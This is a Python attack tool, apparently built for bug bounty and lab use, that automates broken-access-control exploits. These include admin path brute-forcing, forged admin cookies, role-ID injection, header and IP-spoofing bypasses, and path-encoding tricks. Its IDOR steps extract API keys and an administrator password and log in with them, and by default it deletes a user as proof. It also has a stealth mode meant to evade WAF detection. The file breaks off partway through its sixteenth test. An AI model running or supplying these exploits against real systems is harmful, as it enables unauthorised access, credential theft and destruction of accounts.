#!/usr/bin/env python3
"""
=========================================================
  BAC Hunter  ·  Broken Access Control Bug Bounty Suite
  Covers OWASP Top 10  A01:2021 — Broken Access Control
  v2.0  —  Low-noise | Bug Bounty Ready
=========================================================

  Tests:
    [01] Unprotected admin panel (path brute)
    [02] Admin path disclosed in page source
    [03] Cookie-based bypass  (Admin=true)
    [04] Role ID escalation via JSON body
    [05] X-Original-URL / X-Rewrite-URL header override
    [06] HTTP method bypass  (GET on POST-only endpoint)
    [07] IDOR — horizontal escalation (?id=)
    [08] IDOR — GUID leaked in page
    [09] IDOR — sensitive data in 302 body
    [10] IDOR — admin password extraction
    [11] IDOR — insecure file download
    [12] Missing function-level access control (POST)
    [13] Referer-based access control bypass
    [14] IP spoofing / forwarding headers bypass  [NEW]
    [15] Path normalisation / encoding bypass      [NEW]
    [16] HTTP verb tampering (HEAD, OPTIONS, PATCH) [NEW]
    [17] Mass assignment (extra privilege fields)   [NEW]
    [18] Parameter pollution (duplicate params)     [NEW]
    [19] JWT "none" algorithm bypass                [NEW]

  Bug-bounty stealth controls:
    --stealth         Slower jitter delays + UA rotation + rate-limit backoff
    --passive         Skip ALL destructive / mutating PoC actions
    --delay MIN MAX   Custom jitter window  (default: 0.8–2.5 s in stealth mode)
    --ua FILE         Load custom User-Agent list from file
    --creds U:P       Override default test credentials  (default: wiener:peter)
    --output FILE     Write JSON findings report to file

  Usage:
    python3 bac_hunter.py <target_url> [options]

  Examples:
    python3 bac_hunter.py https://target.com --stealth --passive
    python3 bac_hunter.py https://target.com --test 1 5 14 15 16 --stealth
    python3 bac_hunter.py https://target.com --proxy http://127.0.0.1:8080 --output findings.json
    python3 bac_hunter.py https://target.com --creds admin:hunter2 --no-proxy

  DISCLAIMER:
    For authorised penetration testing and bug bounty programs ONLY.
    Only run against systems you own or have explicit written permission
    to test.  Unauthorised use is illegal and unethical.
=========================================================
"""

import requests
import sys
import re
import argparse
import time
import json
import random
import base64
import string
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── ANSI colours ─────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
MAGENTA= "\033[95m"
RESET  = "\033[0m"

# ─── Default User-Agent pool ──────────────────────────────────────────────────
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]

# ─── Globals (set in main) ────────────────────────────────────────────────────
G_STEALTH   = False
G_PASSIVE   = False
G_DELAY_MIN = 0.3
G_DELAY_MAX = 1.0
G_UA_POOL   = list(DEFAULT_USER_AGENTS)
G_CREDS     = ("wiener", "peter")

# ─── Output helpers ───────────────────────────────────────────────────────────
def banner():
    print(f"""
{CYAN}{BOLD}
╔═══════════════════════════════════════════════════════════════╗
║        BAC Hunter  ·  Broken Access Control  v2.0             ║
║        OWASP A01:2021  ·  Low-noise  ·  Bug Bounty Ready      ║
║        For authorised testing and research only               ║
╚═══════════════════════════════════════════════════════════════╝
{RESET}""")

def ok(msg):     print(f"  {GREEN}[+]{RESET} {msg}")
def fail(msg):   print(f"  {RED}[-]{RESET} {msg}")
def info(msg):   print(f"  {CYAN}[*]{RESET} {msg}")
def warn(msg):   print(f"  {YELLOW}[!]{RESET} {msg}")
def vuln(msg):   print(f"  {MAGENTA}{BOLD}[VULN]{RESET} {msg}")

SEVERITY_COLOUR = {
    "Critical": RED + BOLD,
    "High":     MAGENTA,
    "Medium":   YELLOW,
    "Low":      CYAN,
    "Info":     DIM,
}

def section(num, title, sev=""):
    sc = SEVERITY_COLOUR.get(sev, "")
    print(f"\n{BOLD}{CYAN}{'─'*65}{RESET}")
    label = f"  TEST {num:02d}  ·  {title}"
    if sev:
        label += f"  {sc}[{sev}]{RESET}"
    print(f"{BOLD}{CYAN}{label}{RESET}")
    print(f"{BOLD}{CYAN}{'─'*65}{RESET}")

def result_box(findings):
    print(f"\n{BOLD}{CYAN}{'═'*65}{RESET}")
    print(f"{BOLD}{CYAN}  SUMMARY OF FINDINGS{RESET}")
    print(f"{BOLD}{CYAN}{'═'*65}{RESET}")
    if not any(f['vuln'] for f in findings):
        print(f"  {GREEN}No vulnerabilities detected.{RESET}")
    else:
        for item in findings:
            if item['vuln']:
                sc = SEVERITY_COLOUR.get(item.get('severity', 'High'), "")
                print(f"  {GREEN}[VULN]{RESET}  Test {item['id']:02d} — {item['name']}"
                      f"  {sc}[{item.get('severity','?')}]{RESET}")
                if item.get('detail'):
                    print(f"           {DIM}{item['detail']}{RESET}")
            else:
                print(f"  {DIM}[SAFE]{RESET}  Test {item['id']:02d} — {item['name']}")
    print(f"{BOLD}{CYAN}{'═'*65}{RESET}\n")

# ─── Stealth helpers ──────────────────────────────────────────────────────────

def jitter(extra=0.0):
    """Randomised sleep to avoid rate-limiting and WAF detection."""
    t = random.uniform(G_DELAY_MIN, G_DELAY_MAX) + extra
    time.sleep(t)

def random_ua():
    return random.choice(G_UA_POOL)

def stealth_headers(extra: dict | None = None) -> dict:
    """Return a realistic header set with a random UA."""
    h = {
        "User-Agent": random_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    if extra:
        h.update(extra)
    return h

def safe_get(s, url, proxies, verify, extra_headers=None, allow_redirects=True,
             timeout=15, retries=2) -> requests.Response | None:
    """
    GET with stealth headers, jitter, and automatic rate-limit backoff.
    Returns None on unrecoverable error.
    """
    headers = stealth_headers(extra_headers)
    for attempt in range(retries + 1):
        try:
            r = s.get(url, headers=headers, proxies=proxies, verify=verify,
                      timeout=timeout, allow_redirects=allow_redirects)
            if r.status_code == 429:
                wait = int(r.headers.get("Retry-After", 15)) + random.uniform(2, 6)
                warn(f"Rate-limited (429). Backing off {wait:.1f}s …")
                time.sleep(wait)
                continue
            if G_STEALTH:
                jitter()
            return r
        except requests.exceptions.ConnectionError:
            if attempt < retries:
                time.sleep(2 ** attempt)
            else:
                return None
        except Exception:
            return None
    return None

def safe_post(s, url, proxies, verify, data=None, json_data=None,
              extra_headers=None, timeout=15) -> requests.Response | None:
    headers = stealth_headers(extra_headers)
    try:
        r = s.post(url, headers=headers, data=data, json=json_data,
                   proxies=proxies, verify=verify, timeout=timeout,
                   allow_redirects=True)
        if r.status_code == 429:
            wait = int(r.headers.get("Retry-After", 15)) + random.uniform(2, 6)
            warn(f"Rate-limited (429). Backing off {wait:.1f}s …")
            time.sleep(wait)
        if G_STEALTH:
            jitter()
        return r
    except Exception:
        return None

# ─── Auth helpers ─────────────────────────────────────────────────────────────

def new_session():
    s = requests.Session()
    s.headers.update({"User-Agent": random_ua()})
    return s

def get_csrf_token(s, url, proxies, verify=False):
    r = safe_get(s, url, proxies, verify)
    if not r:
        return None
    soup = BeautifulSoup(r.text, 'html.parser')
    tag = soup.find("input", {'name': 'csrf'})
    return tag['value'] if tag else None

def login(s, url, username, password, proxies, verify=False, use_csrf=True):
    login_url = url + "/login"
    csrf = get_csrf_token(s, login_url, proxies, verify) if use_csrf else None
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = safe_post(s, login_url, proxies, verify, data=data)
    if not r:
        fail(f"Login request failed for {username}")
        return False, None
    return "Log out" in r.text, r

def default_login(s, url, proxies, verify):
    u, p = G_CREDS
    return login(s, url, u, p, proxies, verify)

# ─── Test 01 ──────────────────────────────────────────────────────────────────

def test_01_unprotected_admin_panel(url, proxies, verify):
    section(1, "Unprotected Admin Panel (Predictable Path)", "High")
    finding = {'id': 1, 'name': 'Unprotected Admin Panel', 'vuln': False,
               'detail': '', 'severity': 'High'}

    common_paths = [
        '/administrator-panel', '/admin', '/admin-panel', '/administrator',
        '/manage', '/management', '/backend', '/cp', '/control-panel',
        '/dashboard', '/superadmin', '/sysadmin', '/adm', '/admin1',
        '/admin_area', '/panel', '/wp-admin', '/phpmyadmin',
    ]
    s = new_session()
    for path in common_paths:
        test_url = url + path
        info(f"Probing: {test_url}")
        r = safe_get(s, test_url, proxies, verify)
        if not r:
            continue
        if r.status_code == 200 and any(k in r.text.lower() for k in
                ['admin', 'administrator', 'delete user', 'manage user', 'user management']):
            vuln(f"Admin panel accessible at: {test_url}  (HTTP 200)")
            finding['vuln'] = True
            finding['detail'] = f"Accessible at {path} without authentication"
            finding['severity'] = 'Critical'
            if not G_PASSIVE:
                delete_url = test_url + '/delete?username=carlos'
                rd = safe_get(s, delete_url, proxies, verify)
                if rd and rd.status_code == 200:
                    ok("PoC: Unauthenticated user deletion confirmed.")
                    finding['detail'] += " | Unauthenticated user deletion succeeded"
            else:
                warn("PASSIVE MODE: Skipping destructive PoC action.")
        elif r.status_code == 200:
            warn(f"HTTP 200 but no admin content detected at: {path}")
        else:
            info(f"  → HTTP {r.status_code}")

    if not finding['vuln']:
        fail("No unprotected admin panel found on common paths.")
    return finding

# ─── Test 02 ──────────────────────────────────────────────────────────────────

def test_02_admin_path_in_source(url, proxies, verify):
    section(2, "Admin Path Disclosed in Page Source", "High")
    finding = {'id': 2, 'name': 'Admin Path in Source', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    r = safe_get(s, url, proxies, verify)
    if not r:
        fail("Could not fetch home page.")
        return finding

    session_cookie = r.cookies.get_dict().get('session')
    soup = BeautifulSoup(r.text, 'lxml')
    admin_links = soup.find_all(href=re.compile(r'/(admin|administrator|manage|backend|panel)', re.I))
    script_matches = re.findall(r'["\']/(admin[^\s\'"<>]*)["\']', r.text, re.I)

    candidates = set()
    for tag in admin_links:
        candidates.add(tag['href'])
    for m in script_matches:
        candidates.add('/' + m)

    if candidates:
        info(f"Found {len(candidates)} admin path(s) in source: {candidates}")
        for path in candidates:
            probe_url = url + path.split('?')[0]
            cookies = {'session': session_cookie} if session_cookie else {}
            rp = safe_get(s, probe_url, proxies, verify)
            if rp and rp.status_code == 200:
                vuln(f"Admin path accessible: {path}  (HTTP 200)")
                finding['vuln'] = True
                finding['detail'] = f"'{path}' disclosed in source and accessible"
                if not G_PASSIVE:
                    delete_url = url + path.rstrip('/') + '/delete?username=carlos'
                    rd = safe_get(s, delete_url, proxies, verify)
                    if rd and rd.status_code == 200:
                        ok("PoC: User deletion via disclosed path succeeded.")
                else:
                    warn("PASSIVE MODE: Skipping destructive PoC action.")
            else:
                info(f"  → Path {path} returned HTTP {rp.status_code if rp else 'N/A'}")
    else:
        fail("No admin paths found in page source.")

    if not finding['vuln']:
        fail("No exploitable admin path disclosed in source.")
    return finding

# ─── Test 03 ──────────────────────────────────────────────────────────────────

def test_03_cookie_bypass(url, proxies, verify):
    section(3, "Cookie-Based Access Control Bypass (Admin=true)", "High")
    finding = {'id': 3, 'name': 'Cookie Bypass (Admin=true)', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail(f"Could not log in as {G_CREDS[0]} — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    r = safe_get(s, url + "/my-account", proxies, verify)
    session_cookie = s.cookies.get_dict().get('session', '')

    # Try multiple cookie forging variations
    forge_variants = [
        {'Admin': 'true',   'session': session_cookie},
        {'admin': 'true',   'session': session_cookie},
        {'isAdmin': 'true', 'session': session_cookie},
        {'role': 'admin',   'session': session_cookie},
        {'userRole': 'administrator', 'session': session_cookie},
    ]

    for cookies in forge_variants:
        tag = [k for k in cookies if k != 'session'][0]
        info(f"Trying forged cookie: {tag}={cookies[tag]}")
        r = safe_get(s, url + "/admin", proxies, verify, allow_redirects=True)
        if not r:
            continue
        rp = requests.get(url + "/admin", cookies=cookies,
                          verify=verify, proxies=proxies, timeout=10,
                          headers=stealth_headers())
        if rp.status_code == 200 and any(k in rp.text.lower() for k in ['admin panel', 'delete user']):
            vuln(f"Admin access granted via forged cookie: {tag}={cookies[tag]}")
            finding['vuln'] = True
            finding['detail'] = f"{tag}={cookies[tag]} accepted as admin"
            finding['severity'] = 'Critical'
            if not G_PASSIVE:
                rd = requests.get(url + "/admin/delete?username=carlos",
                                  cookies=cookies, verify=verify, proxies=proxies,
                                  timeout=10, headers=stealth_headers())
                if rd.status_code == 200:
                    ok("PoC: Admin action succeeded with forged cookie.")
            else:
                warn("PASSIVE MODE: Skipping destructive PoC action.")
            break

    if not finding['vuln']:
        fail("Cookie forging bypass not confirmed.")
    return finding

# ─── Test 04 ──────────────────────────────────────────────────────────────────

def test_04_role_id_escalation(url, proxies, verify):
    section(4, "Role ID Privilege Escalation (JSON Body)", "High")
    finding = {'id': 4, 'name': 'Role ID Escalation via JSON', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    for role_id in [2, 1, 0, 100, 999, -1]:
        info(f"Trying roleid={role_id} …")
        data = {"email": "security@test.local", "roleid": role_id}
        r = safe_post(s, url + "/my-account/change-email", proxies, verify, json_data=data)
        if r and ('Admin' in r.text or 'admin' in r.text.lower() or r.status_code == 200):
            vuln(f"Privilege escalation via roleid={role_id}")
            finding['vuln'] = True
            finding['detail'] = f"roleid={role_id} accepted"
            if not G_PASSIVE:
                rd = safe_get(s, url + "/admin/delete?username=carlos", proxies, verify)
                if rd and rd.status_code == 200:
                    ok("PoC: carlos deleted after role escalation.")
            else:
                warn("PASSIVE MODE: Skipping destructive PoC.")
            break

    if not finding['vuln']:
        fail("Role ID injection did not grant elevated privileges.")
    return finding

# ─── Test 05 ──────────────────────────────────────────────────────────────────

def test_05_x_original_url_bypass(url, proxies, verify):
    section(5, "X-Original-URL / X-Rewrite-URL Header Bypass", "High")
    finding = {'id': 5, 'name': 'X-Original-URL / X-Rewrite-URL Bypass', 'vuln': False,
               'detail': '', 'severity': 'High'}

    restricted = ['/admin', '/admin/delete', '/administrator-panel', '/manage']
    override_headers = ['X-Original-URL', 'X-Rewrite-URL', 'X-Forwarded-URL']

    s = new_session()
    for hdr in override_headers:
        for path in restricted:
            extra = {hdr: path, 'X-Custom-IP-Authorization': '127.0.0.1'}
            info(f"Testing {hdr}: {path}")
            r = safe_get(s, url + "/?username=carlos", proxies, verify, extra_headers=extra)
            if r and r.status_code == 200:
                if any(k in r.text.lower() for k in ['admin', 'delete user', 'manage']):
                    vuln(f"{hdr}:{path} override accepted!")
                    finding['vuln'] = True
                    finding['detail'] = f"{hdr}: {path} bypassed routing"
                    break
        if finding['vuln']:
            break

    if not finding['vuln']:
        fail("URL override header bypass not detected.")
    return finding

# ─── Test 06 ──────────────────────────────────────────────────────────────────

def test_06_method_based_bypass(url, proxies, verify):
    section(6, "HTTP Method Bypass (GET on POST-only endpoint)", "Medium")
    finding = {'id': 6, 'name': 'Method-Based Bypass (GET→privileged)', 'vuln': False,
               'detail': '', 'severity': 'Medium'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    upgrade_url = url + f"/admin-roles?username={G_CREDS[0]}&action=upgrade"
    r = safe_get(s, upgrade_url, proxies, verify)
    if r and r.status_code == 200 and any(k in r.text.lower() for k in ['admin panel', 'admin']):
        vuln("GET request to privileged POST-only endpoint succeeded.")
        finding['vuln'] = True
        finding['detail'] = f"GET /admin-roles?action=upgrade accepted for non-admin user"
    else:
        fail(f"Method bypass did not work (HTTP {r.status_code if r else 'N/A'}).")
    return finding

# ─── Test 07 ──────────────────────────────────────────────────────────────────

def test_07_idor_horizontal(url, proxies, verify):
    section(7, "IDOR — Horizontal Privilege Escalation (?id=)", "High")
    finding = {'id': 7, 'name': 'IDOR Horizontal Escalation', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    target_ids = ['carlos', 'admin', 'administrator', '1', '2', '0']

    for tid in target_ids:
        r = safe_get(s, url + f"/my-account?id={tid}", proxies, verify)
        if r and r.status_code == 200 and tid in r.text.lower():
            vuln(f"Accessed account for id='{tid}' while logged in as {G_CREDS[0]}!")
            finding['vuln'] = True
            match = re.search(r'Your API Key is:(.*?)(?:</div>|<br)', r.text)
            if match:
                api_key = match.group(1).strip()
                ok(f"API key for '{tid}': {api_key}")
                finding['detail'] = f"IDOR on ?id={tid} — API key: {api_key}"
            else:
                finding['detail'] = f"IDOR on ?id={tid} — account data accessed"

    if not finding['vuln']:
        fail("IDOR via ?id= not confirmed.")
    return finding

# ─── Test 08 ──────────────────────────────────────────────────────────────────

def test_08_idor_guid(url, proxies, verify):
    section(8, "IDOR via Unpredictable GUID (Leaked in Page)", "High")
    finding = {'id': 8, 'name': 'IDOR via GUID', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    r = safe_get(s, url, proxies, verify)
    if not r:
        fail("Cannot reach home page.")
        return finding

    post_ids = list(set(re.findall(r'postId=(\w+)["\']', r.text)))
    info(f"Found {len(post_ids)} post(s) to probe for GUIDs.")

    carlos_guid = None
    for pid in post_ids:
        rp = safe_get(s, url + f"/post?postId={pid}", proxies, verify)
        if rp and 'carlos' in rp.text.lower():
            match = re.search(r'userId=([a-f0-9\-]{20,})', rp.text, re.I)
            if match:
                carlos_guid = match.group(1)
                ok(f"Found carlos GUID in post {pid}: {carlos_guid}")
                break

    if not carlos_guid:
        fail("Could not find a GUID for carlos in any post.")
        return finding

    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        return finding

    r = safe_get(s, url + f"/my-account?id={carlos_guid}", proxies, verify)
    if r and r.status_code == 200 and 'carlos' in r.text.lower():
        vuln(f"Accessed carlos account via GUID!")
        finding['vuln'] = True
        match = re.search(r'Your API Key is:(.*?)(?:</div>|<br)', r.text)
        finding['detail'] = f"GUID {carlos_guid} leaked in post"
        if match:
            finding['detail'] += f" — API key: {match.group(1).strip()}"
    else:
        fail("GUID found but account access was denied.")
    return finding

# ─── Test 09 ──────────────────────────────────────────────────────────────────

def test_09_idor_redirect_leak(url, proxies, verify):
    section(9, "IDOR — Sensitive Data in 302 Redirect Body", "High")
    finding = {'id': 9, 'name': 'IDOR Redirect Leak (302)', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    r = safe_get(s, url + "/my-account?id=carlos", proxies, verify, allow_redirects=False)
    if r:
        info(f"Response code (no redirect): {r.status_code}")
        if 'carlos' in r.text.lower():
            vuln("Data for 'carlos' found in 302 redirect body!")
            finding['vuln'] = True
            match = re.search(r'Your API Key is:(.*?)(?:</div>|<br)', r.text)
            if match:
                finding['detail'] = f"302 body exposes carlos API key: {match.group(1).strip()}"
            else:
                finding['detail'] = "Carlos data exposed in redirect body"
        else:
            fail("No sensitive data found in redirect response.")
    return finding

# ─── Test 10 ──────────────────────────────────────────────────────────────────

def test_10_idor_admin_password(url, proxies, verify):
    section(10, "IDOR — Admin Password Extraction", "Critical")
    finding = {'id': 10, 'name': 'IDOR Admin Password Extraction', 'vuln': False,
               'detail': '', 'severity': 'Critical'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    r = safe_get(s, url + "/my-account?id=administrator", proxies, verify)
    if not r or 'administrator' not in r.text.lower():
        fail("Could not access administrator account page via IDOR.")
        return finding

    soup = BeautifulSoup(r.text, 'html.parser')
    pwd_field = soup.find("input", {'name': 'password'})
    if pwd_field and pwd_field.get('value'):
        admin_password = pwd_field['value']
        vuln(f"Administrator password retrieved via IDOR: {admin_password}")
        finding['vuln'] = True
        finding['detail'] = f"Admin password exposed via IDOR"
        if not G_PASSIVE:
            s2 = new_session()
            la, _ = login(s2, url, 'administrator', admin_password, proxies, verify)
            if la:
                ok("Logged in as administrator with extracted password!")
                rd = safe_get(s2, url + "/admin/delete?username=carlos", proxies, verify)
                if rd and rd.status_code == 200:
                    ok("PoC: carlos deleted — full privilege escalation confirmed.")
                    finding['detail'] += " | Full PoC confirmed"
        else:
            warn("PASSIVE MODE: Skipping admin login PoC.")
    else:
        warn("Accessed admin page but no password field found.")
    return finding

# ─── Test 11 ──────────────────────────────────────────────────────────────────

def test_11_insecure_file_reference(url, proxies, verify):
    section(11, "IDOR — Insecure File Download", "High")
    finding = {'id': 11, 'name': 'IDOR File Download', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    transcript_paths = [f"/download-transcript/{i}.txt" for i in range(1, 6)]
    transcript_paths += ["/files/avatars/carlos.jpg", "/files/1.txt", "/files/logs/1.log",
                         "/download/1", "/download/2", "/attachments/1"]

    for path in transcript_paths:
        r = safe_get(s, url + path, proxies, verify)
        info(f"Probing {path}  →  HTTP {r.status_code if r else 'ERR'}")
        if r and r.status_code == 200 and len(r.text) > 20:
            vuln(f"File accessible without auth: {path}")
            finding['vuln'] = True
            if 'password' in r.text.lower():
                match = re.findall(r'password[^\n]*', r.text, re.I)
                finding['detail'] = f"Credentials in {path}: {match[0] if match else '(found)'}"
                pw_match = re.findall(r'password is (\S+)', r.text, re.I)
                if pw_match and not G_PASSIVE:
                    passwd = pw_match[0].rstrip('.')
                    s2 = new_session()
                    la, _ = login(s2, url, 'carlos', passwd, proxies, verify)
                    if la:
                        ok("PoC: Logged in as carlos using extracted password!")
                        finding['detail'] += " | carlos login confirmed"
            else:
                finding['detail'] = f"File {path} accessible without auth"

    if not finding['vuln']:
        fail("No insecure file download found.")
    return finding

# ─── Test 12 ──────────────────────────────────────────────────────────────────

def test_12_missing_function_access_control(url, proxies, verify):
    section(12, "Missing Function-Level Access Control (POST Upgrade)", "High")
    finding = {'id': 12, 'name': 'Missing Function-Level Access Control', 'vuln': False,
               'detail': '', 'severity': 'High'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        fail("Could not log in — skipping.")
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    if G_PASSIVE:
        warn("PASSIVE MODE: Skipping POST privilege escalation.")
        return finding

    data = {'action': 'upgrade', 'confirmed': 'true', 'username': G_CREDS[0]}
    r = safe_post(s, url + "/admin-roles", proxies, verify, data=data)
    if r and r.status_code == 200:
        vuln("POST /admin-roles accepted for non-admin user — function-level control missing!")
        finding['vuln'] = True
        finding['detail'] = "POST /admin-roles?action=upgrade accepted"
    else:
        fail(f"POST upgrade not accepted (HTTP {r.status_code if r else 'N/A'}).")
    return finding

# ─── Test 13 ──────────────────────────────────────────────────────────────────

def test_13_referer_based_bypass(url, proxies, verify):
    section(13, "Referer-Based Access Control Bypass", "Medium")
    finding = {'id': 13, 'name': 'Referer Header Bypass', 'vuln': False,
               'detail': '', 'severity': 'Medium'}

    s = new_session()
    logged_in, _ = default_login(s, url, proxies, verify)
    if not logged_in:
        return finding

    ok(f"Logged in as {G_CREDS[0]}.")
    # Try multiple Referer values that might be whitelisted
    referer_variants = [
        url + "/admin",
        url + "/admin-panel",
        url + "/administrator",
        "https://trusted.internal/admin",
    ]
    upgrade_url = url + f"/admin-roles?username={G_CREDS[0]}&action=upgrade"

    for ref in referer_variants:
        if G_PASSIVE:
            warn("PASSIVE MODE: Skipping Referer-based privilege escalation.")
            break
        r = safe_get(s, upgrade_url, proxies, verify, extra_headers={"Referer": ref})
        info(f"Referer: {ref}  →  HTTP {r.status_code if r else 'ERR'}")
        if r and r.status_code == 200:
            vuln(f"Referer bypass succeeded with: {ref}")
            finding['vuln'] = True
            finding['detail'] = f"Referer: {ref} was sufficient to bypass access control"
            break

    if not finding['vuln']:
        fail("Referer bypass did not work.")
    return finding

# ─── Test 14 — NEW ────────────────────────────────────────────────────────────

def test_14_ip_spoof_headers(url, proxies, verify):
    """
    Test access control bypass via IP spoofing / trusted-IP forwarding headers.
    Many apps trust X-Forwarded-For, Forwarded, X-Real-IP etc. to be localhost.
    """
    section(14, "IP Spoofing / Forwarding Header Bypass", "High")
    finding = {'id': 14, 'name': 'IP Spoof Header Bypass', 'vuln': False,
               'detail': '', 'severity': 'High'}

    spoof_headers_variants = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
    ]

    restricted_paths = ['/admin', '/admin-panel', '/administrator-panel',
                        '/manage', '/internal', '/actuator', '/metrics']

    s = new_session()
    for hdrs in spoof_headers_variants:
        for path in restricted_paths:
            test_url = url + path
            r = safe_get(s, test_url, proxies, verify, extra_headers=hdrs)
            if r and r.status_code == 200 and any(k in r.text.lower() for k in
                    ['admin', 'delete user', 'manage', 'dashboard', 'panel']):
                hdr_name = list(hdrs.keys())[0]
                vuln(f"IP spoof via {hdr_name}: 127.0.0.1 bypassed access control on {path}!")
                finding['vuln'] = True
                finding['detail'] = f"{hdr_name}: 127.0.0.1 granted access to {path}"
                finding['severity'] = 'Critical'
                return finding
            info(f"  {list(hdrs.keys())[0]}: 127.0.0.1 on {path}  →  HTTP {r.status_code if r else 'ERR'}")

    if not finding['vuln']:
        fail("IP spoofing header bypass not detected.")
    return finding

# ─── Test 15 — NEW ────────────────────────────────────────────────────────────

def test_15_path_normalisation_bypass(url, proxies, verify):
    """
    Test URL path normalisation / encoding bypass techniques.
    WAFs and middleware often normalise paths differently from the app server.
    """
    section(15, "Path Normalisation / Encoding Bypass", "High")
    finding = {'id': 15, 'name': 'Path Normalisation Bypass', 'vuln': False,
               'detail': '', 'severity': 'High'}

    # Generate bypass variants for /admin
    bypass_paths = [
        '/ADMIN',                    # uppercase
        '/Admin',                    # mixed case
        '//admin',                   # double slash
        '/admin/',                   # trailing slash
        '/%61dmin',                  # URL-encode 'a'
        '/admin%20',                 # trailing space
        '/admin%09',                 # tab char
        '/admin%2F',                 # encoded slash
        '/./admin',                  # dot prefix
        '/admin/.',                  # dot suffix
        '/admin;/',                  # semicolon (Spring MVC)
        '/admin..;/',                # Spring MVC dot-dot
        '/%2fadmin',                 # encoded leading slash
        '/admin%00',                 # null byte
        '/admin#',                   # fragment (some frameworks)
    ]

    s = new_session()
    for path in bypass_paths:
        test_url = url + path
        r = safe_get(s, test_url, proxies, verify)
        if r and r.status_code == 200 and any(k in r.text.lower() for k in
                ['admin', 'delete user', 'manage users', 'admin panel']):
            vuln(f"Path normalisation bypass: {path}  →  admin panel accessible!")
            finding['vuln'] = True
            finding['detail'] = f"Path '{path}' bypassed access control"
            return finding
        info(f"  {path}  →  HTTP {r.status_code if r else 'ERR'}")

    if not finding['vuln']:
        fail("Path normalisation bypass not detected.")
    return finding

# ─── Test 16 — NEW ────────────────────────────────────────────────────────────

def test_16_http_verb_tampering(url, proxies, verify):
    """
    Test HTTP verb/method tampering on access-controlled endpoints.
    Some frameworks skip auth checks for uncommon methods (HEAD, OPTIONS, TRACE, PATCH).
    """
    section(16, "HTTP Verb Tampering (HEAD / OPTIONS / TRACE / PATCH)", "Medium")
    finding = {'id': 16, 'name': 'HTTP Verb Tampering', 'vuln': False,
               'detail': '', 'severity': 'Medium'}

    target_paths = ['/admin', '/admin-panel', '/admin-roles', '/manage']
    test_methods = ['HEAD', 'OPTIONS', 'TRACE', 'PATCH', 'PUT', 'DELETE']

    s = new_session()
    for path in target_paths:
        for method in test_methods:
            try:
                r = s.request(method, url + path,
                              headers=stealth_headers(),
                              proxies=proxies, verify=verify, timeout=10)
                info(f"  {method} {path}  →  HTTP {r.status_code}")

                # HEAD: check for 200 where GET would be 403/401
                if method == 'HEAD' and r.status_code == 200:
                    # Confirm GET is actually restricted
                    rg = safe_get(s, url + path, proxies, verify)
                    if rg and rg.status_code in (401, 403):
                        vuln(f"HEAD returns 200 where GET returns {rg.status_code} on {path}")
                        finding['vuln'] = True
                        finding['detail'] = f"HEAD {path}: 200 vs GET: {rg.status_code}"
                        break

                # TRACE might echo request headers, revealing internals
                if method == 'TRACE' and r.status_code == 200:
                    vuln(f"TRACE enabled on {path} — potential information leakage")
                    finding['vuln'] = True
                    finding['detail'] = f"TRACE allowed on {path}"
                    break

                # OPTIONS revealing sensitive methods
                if method == 'OPTIONS' and r.status_code == 200:
                    allowed = r.headers.get('Allow', '')
                    info(f"  Allow: {allowed}")
